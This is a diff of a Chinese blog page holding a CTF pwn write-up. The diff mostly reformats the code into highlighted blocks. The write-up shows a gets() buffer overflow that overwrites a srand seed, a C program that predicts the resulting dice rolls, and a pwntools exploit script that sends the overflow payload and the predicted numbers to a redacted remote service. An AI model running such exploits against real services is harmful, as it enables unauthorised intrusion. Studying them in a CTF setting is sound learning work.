@@ -28,7 +28,7 @@
     </style>
 
     <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+<link rel="stylesheet" href="/css/prism-xonokai.css" type="text/css"></head>
 
 
 <body>
@@ -398,7 +398,7 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        541
+                        539
                     </div>
                     
 
@@ -426,21 +426,45 @@
 <p>从上面伪代码的解析可知：关键在于10次循环，每一次输入的值v4得等于随机数v6（1~6之间）就可以进入sub_C3E函数得到flag</p>
 <p>gets函数：的v7：<br><img src="https://s1.ax1x.com/2020/05/23/YjLvdK.png" alt=""></p>
 <p>可知v7大小0x30-0x10=0x20,下面就是seed这个sedd大小我没从stack中看出，在伪代码中定义的seed是unsigned int seed[2];<br> 大小为8个字节。<br>伪代码中srand用的是seed[0]所以如果能将seed[0]覆盖为以知就可以再写一个程序来得到rand的随机数（在linux中写）<br>得到随机数就能进入目标函数</p>
-<p>尝试：<br>用0x20个字符填满v7后面加上0000，记住gets是将输入做当字符串，所以0000填满了seed[0]后因为seed是int型数据，里面的字符串以ASCII码存入会被直接解释为int数据即：0000的ASCII为0x30303030<br>所以seed的值为0x30303030，所以我们的代码seed值就是0x30303030：<br>#include&lt;stdio.h&gt;<br>#include&lt;stdlib.h&gt;</p>
-<p>int main()<br>{<br>        srand(0x30303030);<br>        int i;<br>        for(i=0;i&lt;=9;i++){<br>                printf(“%d\n”,rand()%6 + 1);<br>        }</p>
-<pre><code>    return 0;</code></pre><p>}<br>结果：</p>
+<p>尝试：<br>用0x20个字符填满v7后面加上0000，记住gets是将输入做当字符串，所以0000填满了seed[0]后因为seed是int型数据，里面的字符串以ASCII码存入会被直接解释为int数据即：0000的ASCII为0x30303030<br>所以seed的值为0x30303030，所以我们的代码seed值就是0x30303030：</p>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span> </span>
+<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>       
+        <span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">0x30303030</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">int</span> i<span class="token punctuation">;</span>
+        <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+
+        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>   </code></pre>
+<p>结果：</p>
 <p><img src="https://s1.ax1x.com/2020/05/23/YjOSiD.png" alt=""></p>
 <p>所以我们payload = “A”*0x20 + “0000”:<br><img src="https://s1.ax1x.com/2020/05/23/YjO9RH.png" alt=""></p>
 <p>确实如此！！！！</p>
-<p>写exp：<br>rom pwn import*</p>
-<p>context.log_level = ‘debug’</p>
-<p>sh = remote(“<strong>*”,*</strong>)</p>
-<p>sh.recv()</p>
-<p>payload = “A”*0x20 + “0000”</p>
-<p>sh.sendline(payload)</p>
-<p>sh.recv()</p>
-<p>num = [“6”,”5”,”1”,”4”,”3”,”1”,”1”,”4”,”3”,”1”]</p>
-<p>for i in range(10):<br>        sh.sendline(num[i])<br>        sh.recv()</p>
+<p>写exp：</p>
+<pre class=" language-python"><code class="language-python">rom pwn <span class="token keyword">import</span><span class="token operator">*</span>
+
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+
+sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"***"</span><span class="token punctuation">,</span><span class="token operator">**</span><span class="token operator">*</span><span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token string">"0000"</span>
+
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+num <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"6"</span><span class="token punctuation">,</span><span class="token string">"5"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">]</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
+        sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
 <p>本地测试：<br><img src="https://s1.ax1x.com/2020/05/23/YjOFsI.png" alt=""></p>
 
             </div>
@@ -787,7 +811,7 @@
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">31.5k</span>
+                <span class="white-color">30k</span>
             
 
             
